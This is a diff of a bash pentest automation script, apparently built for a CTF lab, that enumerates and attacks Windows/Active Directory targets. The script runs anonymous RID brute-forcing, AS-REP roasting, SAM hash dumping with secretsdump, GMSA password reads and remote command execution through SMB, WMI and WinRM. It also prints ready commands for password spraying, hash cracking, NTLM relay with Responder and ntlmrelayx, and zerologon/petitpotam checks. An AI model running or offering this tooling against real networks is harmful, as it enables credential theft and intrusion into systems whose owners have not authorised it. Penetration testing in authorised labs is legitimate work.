@@ -66,8 +66,9 @@ if [ -n "$user" ]; then
         SECRETS_ARG="$domain/$user:$pass@$IP"
         RPCDUMP_ARG="-u $user -p $pass -d $domain"
     else
+        # Username only, no password - use -N for null session
         USER_FLAG="-u $user"
-        RPC_ARG="-U $domain\\\\$user"
+        RPC_ARG="-U $domain\\\\\\\\$user -N"
         SECRETS_ARG="$domain/$user@$IP"
         RPCDUMP_ARG="-u $user -d $domain"
     fi
@@ -214,187 +215,195 @@ else
     echo -e "\n\033[93m[!] Skipping Windows-specific Guest/Anonymous SMB checks (target OS: Linux)\033[0m"
 fi
 
-
-echo -e "\n\033[96m[+] Anonymous RPC User Enumeration (lookupsid.py)\033[0m"
-echo "# Attempting anonymous SID bruteforce to enumerate users..."
-lookupsid_output=$(timeout 30s lookupsid.py -no-pass anonymous@$IP 2>/dev/null | tee nxc-enum/smb/lookupsid-anonymous.txt)
-echo "$lookupsid_output"
-
-# Check if lookupsid found users
-if echo "$lookupsid_output" | grep -q "SidTypeUser\|SidTypeGroup"; then
-    echo -e "\n\033[92m[+] Successfully enumerated users/groups via anonymous RPC!\033[0m"
-    echo "# Results saved to: nxc-enum/smb/lookupsid-anonymous.txt"
-    echo ""
+# Skip Windows-specific anonymous RPC/AD enumeration for Linux
+if [ "$os_type" = "windows" ]; then
+    echo -e "\n\033[96m[+] Anonymous RPC User Enumeration (lookupsid.py)\033[0m"
+    echo "# Attempting anonymous SID bruteforce to enumerate users..."
+    lookupsid_output=$(timeout 30s lookupsid.py -no-pass anonymous@$IP 2>/dev/null | tee nxc-enum/smb/lookupsid-anonymous.txt)
+    echo "$lookupsid_output"
     
-    # Automatically extract and save usernames
-    timestamp=$(date +%Y%m%d_%H%M%S)
-    users_file="nxc-enum/smb/users_${timestamp}.txt"
-    grep 'SidTypeUser' nxc-enum/smb/lookupsid-anonymous.txt | awk -F'\\' '{print $2}' | awk '{print $1}' | grep -v '\$$' > "$users_file"
-    
-    echo -e "\033[92m[+] Extracted usernames saved to: $users_file\033[0m"
-    echo "# Found $(wc -l < "$users_file") users (excluding machine accounts)"
-    echo ""
-    echo "# View users:"
-    echo "cat $users_file"
-    echo ""
-    echo "# Use for password spraying:"
-    echo "nxc smb $IP -u $users_file -p 'Password123' --continue-on-success"
-    echo ""
-    
-    # Try alternative enumeration tools if lookupsid didn't find users
-else
-    echo -e "\n\033[93m[!] lookupsid.py didn't find users, trying alternative tools...\033[0m"
-fi
-
-# Alternative Tool 1: NetExec RID Brute (anonymous)
-echo -e "\n\033[96m[+] Trying NetExec RID Brute (anonymous)\033[0m"
-nxc_rid_output=$(timeout 15s nxc smb $IP -u '' -p '' --rid-brute 2>/dev/null | tee nxc-enum/smb/nxc-rid-anonymous.txt)
-echo "$nxc_rid_output"
-
-# Alternative Tool 2: rpcclient enumdomusers
-echo -e "\n\033[96m[+] Trying rpcclient enumdomusers (anonymous)\033[0m"
-rpcclient_output=$(rpcclient -U '' -N $IP -c 'enumdomusers' 2>/dev/null | tee nxc-enum/smb/rpcclient-enumdomusers.txt)
-echo "$rpcclient_output"
-
-# Alternative Tool 3: samrdump.py
-echo -e "\n\033[96m[+] Trying samrdump.py (anonymous)\033[0m"
-samrdump_output=$(timeout 15s samrdump.py $IP 2>/dev/null | tee nxc-enum/smb/samrdump-anonymous.txt)
-echo "$samrdump_output"
-
-# Alternative Tool 4: enum4linux (if installed)
-if command -v enum4linux &> /dev/null; then
-    echo -e "\n\033[96m[+] Trying enum4linux (anonymous)\033[0m"
-    timeout 30s enum4linux -U $IP 2>/dev/null | tee nxc-enum/smb/enum4linux-users.txt
-fi
-
-# Check if we got users from any tool and create users file if not already created
-users_file_count=$(ls nxc-enum/smb/users_*.txt 2>/dev/null | wc -l)
-if [ "$users_file_count" -eq 0 ]; then
-    # Try to extract from alternative tools
-    timestamp=$(date +%Y%m%d_%H%M%S)
-    users_file="nxc-enum/smb/users_${timestamp}.txt"
-    
-    # Try nxc output
-    if echo "$nxc_rid_output" | grep -q "SidTypeUser"; then
-        echo "$nxc_rid_output" | grep "SidTypeUser" | awk '{print $NF}' | grep -v '\$$' > "$users_file"
-    fi
-    
-    # Try rpcclient output
-    if [ ! -s "$users_file" ] && echo "$rpcclient_output" | grep -q "user:"; then
-        echo "$rpcclient_output" | grep "user:" | awk -F'[][]' '{print $2}' > "$users_file"
-    fi
-    
-    # If we got users, show them
-    if [ -s "$users_file" ]; then
-        echo -e "\n\033[92m[+] Extracted usernames from alternative tools: $users_file\033[0m"
-        echo "# Found $(wc -l < "$users_file") users"
-    fi
-else
-    # Users file already exists from lookupsid
-    users_file=$(ls -t nxc-enum/smb/users_*.txt 2>/dev/null | head -n1)
-fi
-
-# Continue with AS-REP roasting if we have a users file
-if [ -n "$users_file" ] && [ -s "$users_file" ]; then
-    
-    # AS-REP Roasting with GetNPUsers.py
-    echo -e "\n\033[96m[+] Checking for AS-REP Roastable users (GetNPUsers.py)\033[0m"
-    
-    # Try to get domain name
-    if [ -n "$domain" ]; then
-        domain_name="$domain"
-    else
-        # Try to extract from guest output first
-        domain_name=$(echo "$guest_output" | grep -oP '(?<=domain:)[^\)]+' | head -n1 | tr -d ' ')
-        
-        # If not found, try anonymous output
-        if [ -z "$domain_name" ]; then
-            domain_name=$(echo "$anon_output" | grep -oP '(?<=domain:)[^\)]+' | head -n1 | tr -d ' ')
-        fi
-        
-        # If still not found, try lookupsid output
-        if [ -z "$domain_name" ]; then
-            domain_name=$(echo "$lookupsid_output" | grep -oP 'VULNNET-RST|[A-Z]+-[A-Z]+' | head -n1)
-        fi
-    fi
-    
-    if [ -n "$domain_name" ] && [ "$domain_name" != "DOMAIN" ]; then
-        echo "# Using domain: $domain_name"
-        getnpusers_output=$(GetNPUsers.py "${domain_name}/" -usersfile "$users_file" -no-pass -dc-ip $IP 2>/dev/null | tee nxc-enum/smb/asrep-getnpusers.txt)
-        echo "$getnpusers_output"
-        
-        # Check if any AS-REP roastable users were found
-        if echo "$getnpusers_output" | grep -q '\$krb5asrep\$'; then
-            # Extract just the hashes to a clean file
-            grep '\$krb5asrep\$' nxc-enum/smb/asrep-getnpusers.txt > nxc-enum/smb/asrep-hashes.txt
-            
-            # Extract vulnerable usernames
-            vulnerable_users=$(grep '\$krb5asrep\$' nxc-enum/smb/asrep-getnpusers.txt | grep -oP '\$krb5asrep\$23\$\K[^@]+' | tr '\n' ', ' | sed 's/,$//')
-            
-            echo -e "\n\033[92m[+] AS-REP Roastable users found: $vulnerable_users\033[0m"
-            echo "# Full output: nxc-enum/smb/asrep-getnpusers.txt"
-            echo "# Clean hashes: nxc-enum/smb/asrep-hashes.txt"
-            echo ""
-            echo "# Crack with John the Ripper:"
-            echo "john --wordlist=/usr/share/wordlists/rockyou.txt nxc-enum/smb/asrep-hashes.txt"
-            echo ""
-            echo "# Or with Hashcat:"
-            echo "hashcat -m 18200 nxc-enum/smb/asrep-hashes.txt /usr/share/wordlists/rockyou.txt"
-            echo ""
-            echo "# Show cracked passwords:"
-            echo "john --show nxc-enum/smb/asrep-hashes.txt"
-        fi
-    else
-        echo "# Could not auto-detect domain name"
-        echo "# Run manually with: GetNPUsers.py DOMAIN/ -usersfile $users_file -no-pass -dc-ip $IP"
-        echo "# Or re-run script with: ./nxc-auto.sh -i $IP -d vulnnet-rst.local"
-    fi
-    echo ""
-fi
-
-
-
-echo -e "\n\033[96m[+] Checking FTP Anonymous access\033[0m"
-ftp_output=$(timeout 5s nxc ftp $IP -u 'anonymous' -p 'anonymous' --timeout 2)
-echo "$ftp_output"
-
-# Check if anonymous FTP access succeeded and suggest commands
-if echo "$ftp_output" | grep -q "\[+\]"; then
-    echo -e "\n\033[92m[+] Anonymous FTP access successful! Suggested commands:\033[0m"
-    echo "ftp $IP"
-    echo "# Username: anonymous"
-    echo "# Password: anonymous"
-    echo ""
-    echo "# Or use lftp for better features:"
-    echo "lftp -u anonymous,anonymous $IP"
-    echo ""
-    echo "# Download all files recursively:"
-    echo "wget -r ftp://anonymous:anonymous@$IP/"
-    echo ""
-fi
-
-echo -e "\n\033[96m[+] Checking LDAP Anonymous access\033[0m"
-ldap_output=$(timeout 5s nxc ldap $IP -u '' -p '' --timeout 2)
-echo "$ldap_output"
-
-# Check if anonymous LDAP access succeeded and suggest commands
-if echo "$ldap_output" | grep -q "\[+\]"; then
-    echo -e "\n\033[92m[+] Anonymous LDAP access successful! Suggested commands:\033[0m"
-    
-    # Extract domain from output for base DN
-    if [ -n "$domain" ]; then
-        base_dn=$(echo "$domain" | sed 's/\./,DC=/g' | sed 's/^/DC=/')
-        echo "ldapsearch -x -H ldap://$IP -b \"$base_dn\" -s sub \"(objectClass=*)\" | tee ldap-dump.txt"
-        echo "ldapsearch -x -H ldap://$IP -b \"$base_dn\" \"(objectClass=user)\" | tee ldap-users.txt"
-        echo "ldapsearch -x -H ldap://$IP -b \"$base_dn\" \"(objectClass=group)\" | tee ldap-groups.txt"
-    else
-        echo "# Get base DN (usually works anonymously):"
-        echo "ldapsearch -x -H ldap://$IP -b \"\" -s base namingContexts"
+    # Check if lookupsid found users
+    if echo "$lookupsid_output" | grep -q "SidTypeUser\|SidTypeGroup"; then
+        echo -e "\n\033[92m[+] Successfully enumerated users/groups via anonymous RPC!\033[0m"
+        echo "# Results saved to: nxc-enum/smb/lookupsid-anonymous.txt"
         echo ""
-        echo "# Note: Object enumeration often requires credentials. Try with valid creds:"
-        echo "# ldapsearch -x -H ldap://$IP -D \"CN=user,DC=domain,DC=local\" -w 'password' -b \"DC=domain,DC=local\" -s sub \"(objectClass=*)\""
+        
+        # Automatically extract and save usernames
+        timestamp=$(date +%Y%m%d_%H%M%S)
+        users_file="nxc-enum/smb/users_${timestamp}.txt"
+        grep 'SidTypeUser' nxc-enum/smb/lookupsid-anonymous.txt | awk -F'\\' '{print $2}' | awk '{print $1}' | grep -v '\$$' > "$users_file"
+        
+        echo -e "\033[92m[+] Extracted usernames saved to: $users_file\033[0m"
+        echo "# Found $(wc -l < "$users_file") users (excluding machine accounts)"
+        echo ""
+        echo "# View users:"
+        echo "cat $users_file"
+        echo ""
+        echo "# Use for password spraying:"
+        echo "nxc smb $IP -u $users_file -p 'Password123' --continue-on-success"
+        echo ""
+        
+        # Try alternative enumeration tools if lookupsid didn't find users
+    else
+        echo -e "\n\033[93m[!] lookupsid.py didn't find users, trying alternative tools...\033[0m"
     fi
-    echo ""
+    
+    # Alternative Tool 1: NetExec RID Brute (anonymous)
+    echo -e "\n\033[96m[+] Trying NetExec RID Brute (anonymous)\033[0m"
+    nxc_rid_output=$(timeout 15s nxc smb $IP -u '' -p '' --rid-brute 2>/dev/null | tee nxc-enum/smb/nxc-rid-anonymous.txt)
+    echo "$nxc_rid_output"
+    
+    # Alternative Tool 2: rpcclient enumdomusers
+    echo -e "\n\033[96m[+] Trying rpcclient enumdomusers (anonymous)\033[0m"
+    rpcclient_output=$(rpcclient -U '' -N $IP -c 'enumdomusers' 2>/dev/null | tee nxc-enum/smb/rpcclient-enumdomusers.txt)
+    echo "$rpcclient_output"
+    
+    # Alternative Tool 3: samrdump.py
+    echo -e "\n\033[96m[+] Trying samrdump.py (anonymous)\033[0m"
+    samrdump_output=$(timeout 15s samrdump.py $IP 2>/dev/null | tee nxc-enum/smb/samrdump-anonymous.txt)
+    echo "$samrdump_output"
+    
+    # Alternative Tool 4: enum4linux (if installed)
+    if command -v enum4linux &> /dev/null; then
+        echo -e "\n\033[96m[+] Trying enum4linux (anonymous)\033[0m"
+        timeout 30s enum4linux -U $IP 2>/dev/null | tee nxc-enum/smb/enum4linux-users.txt
+    fi
+    
+    # Check if we got users from any tool and create users file if not already created
+    users_file_count=$(ls nxc-enum/smb/users_*.txt 2>/dev/null | wc -l)
+    if [ "$users_file_count" -eq 0 ]; then
+        # Try to extract from alternative tools
+        timestamp=$(date +%Y%m%d_%H%M%S)
+        users_file="nxc-enum/smb/users_${timestamp}.txt"
+        
+        # Try nxc output
+        if echo "$nxc_rid_output" | grep -q "SidTypeUser"; then
+            echo "$nxc_rid_output" | grep "SidTypeUser" | awk '{print $NF}' | grep -v '\$$' > "$users_file"
+        fi
+        
+        # Try rpcclient output
+        if [ ! -s "$users_file" ] && echo "$rpcclient_output" | grep -q "user:"; then
+            echo "$rpcclient_output" | grep "user:" | awk -F'[][]' '{print $2}' > "$users_file"
+        fi
+        
+        # If we got users, show them
+        if [ -s "$users_file" ]; then
+            echo -e "\n\033[92m[+] Extracted usernames from alternative tools: $users_file\033[0m"
+            echo "# Found $(wc -l < "$users_file") users"
+        fi
+    else
+        # Users file already exists from lookupsid
+        users_file=$(ls -t nxc-enum/smb/users_*.txt 2>/dev/null | head -n1)
+    fi
+    
+    # Continue with AS-REP roasting if we have a users file
+    if [ -n "$users_file" ] && [ -s "$users_file" ]; then
+        
+        # AS-REP Roasting with GetNPUsers.py
+        echo -e "\n\033[96m[+] Checking for AS-REP Roastable users (GetNPUsers.py)\033[0m"
+        
+        # Try to get domain name
+        if [ -n "$domain" ]; then
+            domain_name="$domain"
+        else
+            # Try to extract from guest output first
+            domain_name=$(echo "$guest_output" | grep -oP '(?<=domain:)[^\)]+' | head -n1 | tr -d ' ')
+            
+            # If not found, try anonymous output
+            if [ -z "$domain_name" ]; then
+                domain_name=$(echo "$anon_output" | grep -oP '(?<=domain:)[^\)]+' | head -n1 | tr -d ' ')
+            fi
+            
+            # If still not found, try lookupsid output
+            if [ -z "$domain_name" ]; then
+                domain_name=$(echo "$lookupsid_output" | grep -oP 'VULNNET-RST|[A-Z]+-[A-Z]+' | head -n1)
+            fi
+        fi
+        
+        if [ -n "$domain_name" ] && [ "$domain_name" != "DOMAIN" ]; then
+            echo "# Using domain: $domain_name"
+            getnpusers_output=$(GetNPUsers.py "${domain_name}/" -usersfile "$users_file" -no-pass -dc-ip $IP 2>/dev/null | tee nxc-enum/smb/asrep-getnpusers.txt)
+            echo "$getnpusers_output"
+            
+            # Check if any AS-REP roastable users were found
+            if echo "$getnpusers_output" | grep -q '\$krb5asrep\$'; then
+                # Extract just the hashes to a clean file
+                grep '\$krb5asrep\$' nxc-enum/smb/asrep-getnpusers.txt > nxc-enum/smb/asrep-hashes.txt
+                
+                # Extract vulnerable usernames
+                vulnerable_users=$(grep '\$krb5asrep\$' nxc-enum/smb/asrep-getnpusers.txt | grep -oP '\$krb5asrep\$23\$\K[^@]+' | tr '\n' ', ' | sed 's/,$//')
+                
+                echo -e "\n\033[92m[+] AS-REP Roastable users found: $vulnerable_users\033[0m"
+                echo "# Full output: nxc-enum/smb/asrep-getnpusers.txt"
+                echo "# Clean hashes: nxc-enum/smb/asrep-hashes.txt"
+                echo ""
+                echo "# Crack with John the Ripper:"
+                echo "john --wordlist=/usr/share/wordlists/rockyou.txt nxc-enum/smb/asrep-hashes.txt"
+                echo ""
+                echo "# Or with Hashcat:"
+                echo "hashcat -m 18200 nxc-enum/smb/asrep-hashes.txt /usr/share/wordlists/rockyou.txt"
+                echo ""
+                echo "# Show cracked passwords:"
+                echo "john --show nxc-enum/smb/asrep-hashes.txt"
+            fi
+        else
+            echo "# Could not auto-detect domain name"
+            echo "# Run manually with: GetNPUsers.py DOMAIN/ -usersfile $users_file -no-pass -dc-ip $IP"
+            echo "# Or re-run script with: ./nxc-auto.sh -i $IP -d DOMAIN"
+        fi
+        echo ""
+    fi
+else
+    echo -e "\n\033[93m[!] Skipping Windows-specific anonymous RPC/AD enumeration (target OS: Linux)\033[0m"
+fi
+
+
+
+
+# FTP and LDAP anonymous checks (Windows-specific)
+if [ "$os_type" = "windows" ]; then
+    echo -e "\n\033[96m[+] Checking FTP Anonymous access\033[0m"
+    ftp_output=$(timeout 5s nxc ftp $IP -u 'anonymous' -p 'anonymous' --timeout 2)
+    echo "$ftp_output"
+    
+    # Check if anonymous FTP access succeeded and suggest commands
+    if echo "$ftp_output" | grep -q "\[+\]"; then
+        echo -e "\n\033[92m[+] Anonymous FTP access successful! Suggested commands:\033[0m"
+        echo "ftp $IP"
+        echo "# Username: anonymous"
+        echo "# Password: anonymous"
+        echo ""
+        echo "# Or use lftp for better features:"
+        echo "lftp -u anonymous,anonymous $IP"
+        echo ""
+        echo "# Download all files recursively:"
+        echo "wget -r ftp://anonymous:anonymous@$IP/"
+        echo ""
+    fi
+    
+    echo -e "\n\033[96m[+] Checking LDAP Anonymous access\033[0m"
+    ldap_output=$(timeout 5s nxc ldap $IP -u '' -p '' --timeout 2)
+    echo "$ldap_output"
+    
+    # Check if anonymous LDAP access succeeded and suggest commands
+    if echo "$ldap_output" | grep -q "\[+\]"; then
+        echo -e "\n\033[92m[+] Anonymous LDAP access successful! Suggested commands:\033[0m"
+        
+        # Extract domain from output for base DN
+        if [ -n "$domain" ]; then
+            base_dn=$(echo "$domain" | sed 's/\./,DC=/g' | sed 's/^/DC=/')
+            echo "ldapsearch -x -H ldap://$IP -b \"$base_dn\" -s sub \"(objectClass=*)\" | tee ldap-dump.txt"
+            echo "ldapsearch -x -H ldap://$IP -b \"$base_dn\" \"(objectClass=user)\" | tee ldap-users.txt"
+            echo "ldapsearch -x -H ldap://$IP -b \"$base_dn\" \"(objectClass=group)\" | tee ldap-groups.txt"
+        else
+            echo "# Get base DN (usually works anonymously):"
+            echo "ldapsearch -x -H ldap://$IP -b \"\" -s base namingContexts"
+            echo ""
+            echo "# Note: Object enumeration often requires credentials. Try with valid creds:"
+            echo "# ldapsearch -x -H ldap://$IP -D \"CN=user,DC=domain,DC=local\" -w 'password' -b \"DC=domain,DC=local\" -s sub \"(objectClass=*)\""
+        fi
+        echo ""
+    fi
 fi
 
 echo -e "\n\033[96m[+] NFS Enumeration (No credentials required)\033[0m"
@@ -550,19 +559,96 @@ check_and_suggest() {
     fi
 }
 
-echo -e "\n\033[96m[+] Validating credentials\033[0m\n"
-# Build optional flags
-# Flags already built at the top
 
-# SMB (anonymous allowed, domain optional)
-# Added --shares to check shares in one go
-check_and_suggest smb nxc smb $IP $DOMAIN_FLAG $USER_FLAG --shares --timeout 2
-
-# LDAP requires username (domain optional)
-if [ -n "$user" ]; then
-    check_and_suggest ldap nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --timeout 2
-else
-    echo -e "\n\033[93m[!] Skipping LDAP check (no username supplied)\033[0m"
+# Credential validation (Windows-specific)
+if [ "$os_type" = "windows" ]; then
+    echo -e "\n\033[96m[+] Validating credentials\033[0m\n"
+    # Build optional flags
+    # Flags already built at the top
+    
+    # SMB (anonymous allowed, domain optional)
+    # Added --shares to check shares in one go
+    smb_output=$(check_and_suggest smb nxc smb $IP $DOMAIN_FLAG $USER_FLAG --shares --timeout 2)
+    echo "$smb_output"
+    
+    # Check for SMB signing status
+    if echo "$smb_output" | grep -q "signing:True"; then
+        echo -e "\n\033[93m[!] SMB Signing is ENABLED\033[0m"
+        echo -e "\033[96m[+] Impact:\033[0m"
+        echo "  - NTLM relay attacks are NOT possible"
+        echo "  - Man-in-the-middle attacks are prevented"
+        echo "  - SMB traffic is cryptographically signed"
+        echo ""
+        echo -e "\033[96m[+] What you CAN still do:\033[0m"
+        echo ""
+        echo "# 1. Password Spraying:"
+        echo "nxc smb $IP -u users.txt -p 'Password123' --continue-on-success"
+        echo "nxc smb $IP -u users.txt -p passwords.txt --no-bruteforce --continue-on-success"
+        echo ""
+        echo "# 2. Kerberoasting (extract and crack service account passwords):"
+        echo "nxc ldap $IP -u '$user' -p '$pass' --kerberoasting kerberoast.txt"
+        echo "john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt"
+        echo ""
+        echo "# 3. AS-REP Roasting (accounts without pre-auth):"
+        echo "GetNPUsers.py $domain/ -usersfile users.txt -no-pass -dc-ip $IP"
+        echo ""
+        echo "# 4. Enumerate users for further attacks:"
+        echo "nxc smb $IP -u '' -p '' --rid-brute"
+        echo "lookupsid.py -no-pass anonymous@$IP"
+        echo ""
+        echo "# 5. Check for common vulnerabilities:"
+        echo "nxc smb $IP -u '$user' -p '$pass' -M zerologon"
+        echo "nxc smb $IP -u '$user' -p '$pass' -M petitpotam"
+        echo ""
+        echo "# 6. LDAP enumeration and attacks:"
+        echo "nxc ldap $IP -u '$user' -p '$pass' --bloodhound -c All"
+        echo "nxc ldap $IP -u '$user' -p '$pass' --users --admin-count"
+        echo ""
+    elif echo "$smb_output" | grep -q "signing:False"; then
+        echo -e "\n\033[92m[!] SMB Signing is DISABLED - NTLM relay attacks possible!\033[0m"
+        echo -e "\033[96m[+] Exploitation suggestions:\033[0m"
+        echo "  # NTLM Relay to SMB:"
+        echo "  ntlmrelayx.py -tf targets.txt -smb2support"
+        echo ""
+        echo "  # NTLM Relay to LDAP (for privilege escalation):"
+        echo "  ntlmrelayx.py -t ldap://$IP --escalate-user lowpriv"
+        echo ""
+        echo "  # Capture and relay with Responder:"
+        echo "  responder -I eth0 -wv"
+        echo "  ntlmrelayx.py -tf targets.txt -smb2support"
+        echo ""
+    fi
+    
+    # LDAP requires username (domain optional)
+    if [ -n "$user" ]; then
+        check_and_suggest ldap nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --timeout 2
+    else
+        echo -e "\n\033[93m[!] Skipping LDAP check (no username supplied)\033[0m"
+    fi
+    
+    # RDP check (requires username)
+    if [ -n "$user" ]; then
+        echo -e "\n\033[96m[+] RDP Enumeration:\033[0m"
+        echo -e "\n\033[91m[+] RDP Credentials Check\033[0m\n"
+        rdp_output=$(check_and_suggest rdp nxc rdp $IP $DOMAIN_FLAG $USER_FLAG)
+        echo "$rdp_output"
+        
+        # Check if RDP access was successful
+        if echo "$rdp_output" | grep -q "\[+\]"; then
+            echo -e "\n\033[92m[+] RDP access successful! Connect with:\033[0m"
+            if [ -n "$domain" ]; then
+                echo "xfreerdp /v:$IP /u:$domain\\\\$user /p:'$pass' /cert-ignore +clipboard /dynamic-resolution"
+            else
+                echo "xfreerdp /v:$IP /u:$user /p:'$pass' /cert-ignore +clipboard /dynamic-resolution"
+            fi
+            echo ""
+            echo "# Or with rdesktop:"
+            echo "rdesktop -u $user -p '$pass' -d $domain $IP"
+            echo ""
+        fi
+    else
+        echo -e "\n\033[93m[!] Skipping RDP check (no username supplied)\033[0m"
+    fi
 fi
 
 # WinRM requires cr
@@ -571,16 +657,60 @@ fi
 
 # Skip all Windows-specific enumeration for Linux targets
 if [ "$os_type" = "windows" ]; then
-    echo -e "\n\033[96m[+] RPC Enumeration (rpcclient)\033[0m\n"
-    rpcclient $RPC_ARG $IP -c "queryuser 0" 2>/dev/null # RPC user query
-    rpcclient $RPC_ARG $IP -c "enumdomusers" 2>/dev/null | tee nxc-enum/smb/rpc-enumdomusers.txt # Enumerate domain users via RPC
-    rpcclient $RPC_ARG $IP -c "enumdomgroups" 2>/dev/null | tee nxc-enum/smb/rpc-enumdomgroups.txt # Enumerate domain groups via RPC
-    
+    # RPC enumeration - works with username only (null password)
     if [ -n "$user" ]; then
-        echo -e "\n\033[96m[+] RPC Secrets Dump (impacket-secretsdump)\033[0m\n"
-        impacket-secretsdump $SECRETS_ARG 2>/dev/null | tee nxc-enum/smb/rpc-secretsdump.txt # Dump SAM hashes via RPC
+        echo -e "\n\033[96m[+] RPC Enumeration (rpcclient)\033[0m\n"
+        rpcclient $RPC_ARG $IP -c "queryuser 0" 2>/dev/null # RPC user query
+        rpcclient $RPC_ARG $IP -c "enumdomusers" 2>/dev/null | tee nxc-enum/smb/rpc-enumdomusers.txt # Enumerate domain users via RPC
+        rpcclient $RPC_ARG $IP -c "enumdomgroups" 2>/dev/null | tee nxc-enum/smb/rpc-enumdomgroups.txt # Enumerate domain groups via RPC
+        
+        # Extract usernames to a clean list
+        if [ -f nxc-enum/smb/rpc-enumdomusers.txt ] && grep -q "user:" nxc-enum/smb/rpc-enumdomusers.txt; then
+            # Notify if overwriting existing file
+            if [ -f rpcuserlist.txt ]; then
+                echo -e "\n\033[93m[!] Overwriting existing rpcuserlist.txt\033[0m"
+            fi
+            
+            grep "user:" nxc-enum/smb/rpc-enumdomusers.txt | awk -F'[][]' '{print $2}' > rpcuserlist.txt
+            user_count=$(wc -l < rpcuserlist.txt)
+            echo -e "\n\033[92m[+] Extracted $user_count usernames to: rpcuserlist.txt\033[0m"
+            echo ""
+            echo -e "\033[96m[+] Suggested attacks with this user list:\033[0m"
+            echo ""
+            echo "# 1. Password spraying with NetExec:"
+            echo "nxc smb $IP -u rpcuserlist.txt -p 'Password123' --continue-on-success"
+            echo "nxc smb $IP -u rpcuserlist.txt -p passwords.txt --no-bruteforce --continue-on-success"
+            echo ""
+            echo "# 2. Password spraying with kerbrute:"
+            if [ -n "$domain" ]; then
+                echo "kerbrute passwordspray -d $domain --dc $IP rpcuserlist.txt 'Password123'"
+                echo "kerbrute bruteuser -d $domain --dc $IP passwords.txt username"
+                echo ""
+                echo "# 3. AS-REP roasting (no password needed):"
+                echo "GetNPUsers.py $domain/ -usersfile rpcuserlist.txt -no-pass -dc-ip $IP"
+                echo ""
+                echo "# 4. Validate usernames with kerbrute:"
+                echo "kerbrute userenum -d $domain --dc $IP rpcuserlist.txt"
+            else
+                echo "kerbrute passwordspray -d DOMAIN --dc $IP rpcuserlist.txt 'Password123'"
+                echo ""
+                echo "# 3. AS-REP roasting (no password needed):"
+                echo "GetNPUsers.py DOMAIN/ -usersfile rpcuserlist.txt -no-pass -dc-ip $IP"
+                echo ""
+                echo "# Note: Specify domain with -d flag for kerbrute commands"
+            fi
+            echo ""
+        fi
+        
+        # secretsdump requires actual credentials
+        if [ -n "$pass" ] || [ -n "$hash" ]; then
+            echo -e "\n\033[96m[+] RPC Secrets Dump (impacket-secretsdump)\033[0m\n"
+            impacket-secretsdump $SECRETS_ARG 2>/dev/null | tee nxc-enum/smb/rpc-secretsdump.txt # Dump SAM hashes via RPC
+        else
+            echo -e "\n\033[93m[!] Skipping RPC Secrets Dump (requires password/hash)\033[0m"
+        fi
     else
-        echo -e "\n\033[93m[!] Skipping RPC Secrets Dump (no credentials supplied)\033[0m"
+        echo -e "\n\033[93m[!] Skipping RPC Enumeration (no username supplied)\033[0m"
     fi
     
     echo -e "\n\033[96m[+] RPC Endpoint Dump (impacket-rpcdump)\033[0m\n"
@@ -601,66 +731,67 @@ if [ "$os_type" = "windows" ]; then
     
     if [ -n "$user" ]; then
         echo -e "\n\033[96m[+] Enumerating domain users\033[0m\n"
-        unbuffer nxc smb $IP $USER_FLAG --users | tee nxc-enum/smb/users.txt
-        unbuffer nxc ldap $IP $USER_FLAG --users --active-users | tee nxc-enum/ldap/active-users.txt
+        unbuffer nxc smb $IP $USER_FLAG --users 2>/dev/null | tee nxc-enum/smb/users.txt
+        unbuffer nxc ldap $IP $USER_FLAG --users --active-users 2>/dev/null | tee nxc-enum/ldap/active-users.txt
     
         echo -e "\n\033[96m[+] Enumerating logged users\033[0m\n"
-        unbuffer nxc smb $IP $USER_FLAG --loggedon-users | tee nxc-enum/smb/logged-users.txt
+        unbuffer nxc smb $IP $USER_FLAG --loggedon-users 2>/dev/null | tee nxc-enum/smb/logged-users.txt
     
         echo -e "\n\033[96m[+] Enumerating Admin users\033[0m\n"
-        unbuffer nxc ldap $IP $USER_FLAG --users --admin-count | tee nxc-enum/ldap/admin-count-users.txt
+        unbuffer nxc ldap $IP $USER_FLAG --users --admin-count 2>/dev/null | tee nxc-enum/ldap/admin-count-users.txt
     
         echo -e "\n\033[96m[+] Enumerating domain users by bruteforcing RID\033[0m\n"
-        unbuffer nxc smb $IP $USER_FLAG --rid-brute | tee nxc-enum/smb/rid-bruteforce.txt
+        unbuffer nxc smb $IP $USER_FLAG --rid-brute 2>/dev/null | tee nxc-enum/smb/rid-bruteforce.txt
     
         echo -e "\n\033[96m[+] Enumerating domain groups\033[0m\n"
-        unbuffer nxc smb $IP $USER_FLAG --groups | tee nxc-enum/smb/domain-groups.txt
+        unbuffer nxc smb $IP $USER_FLAG --groups 2>/dev/null | tee nxc-enum/smb/domain-groups.txt
     
         echo -e "\n\033[96m[+] Enumerating local groups\033[0m\n"
-        unbuffer nxc smb $IP $USER_FLAG --local-groups | tee nxc-enum/smb/local-groups.txt
+        unbuffer nxc smb $IP $USER_FLAG --local-groups 2>/dev/null | tee nxc-enum/smb/local-groups.txt
     
         echo -e "\n\033[96m[+] Dumping password policy\033[0m\n"
-        unbuffer nxc smb $IP $USER_FLAG --pass-pol | tee nxc-enum/smb/pw-policy.txt
+        unbuffer nxc smb $IP $USER_FLAG --pass-pol 2>/dev/null | tee nxc-enum/smb/pw-policy.txt
     
         echo -e "\n\033[96m[+] Trying to execute commands:\033[0m\n"
-        nxc smb $IP $USER_FLAG -x whoami
-        nxc smb $IP $USER_FLAG -X '$PSVersionTable'
-        nxc wmi $IP $USER_FLAG -x whoami
-        nxc winrm $IP $USER_FLAG -x whoami
+        nxc smb $IP $USER_FLAG -x whoami 2>/dev/null
+        nxc smb $IP $USER_FLAG -X '$PSVersionTable' 2>/dev/null
+        nxc wmi $IP $USER_FLAG -x whoami 2>/dev/null
+        nxc winrm $IP $USER_FLAG -x whoami 2>/dev/null
     else
         echo -e "\n\033[93m[!] Skipping User/Group Enumeration & Command Execution (no username supplied)\033[0m"
     fi
     
-    if [ -n "$user" ]; then
+    # LDAP modules require actual authentication - skip if no password/hash
+    if [ -n "$user" ] && { [ -n "$pass" ] || [ -n "$hash" ]; }; then
         echo -e "\n\033[91m[+] GMSA Passwords:\033[0m\n"
-        unbuffer nxc ldap $IP $USER_FLAG --users --gmsa | tee nxc-enum/ldap/gmsa.txt  
+        unbuffer nxc ldap $IP $USER_FLAG --users --gmsa 2>/dev/null | tee nxc-enum/ldap/gmsa.txt  
     
         echo -e "\n\033[91m[+] Checking Anti Virus:\033[0m\n"
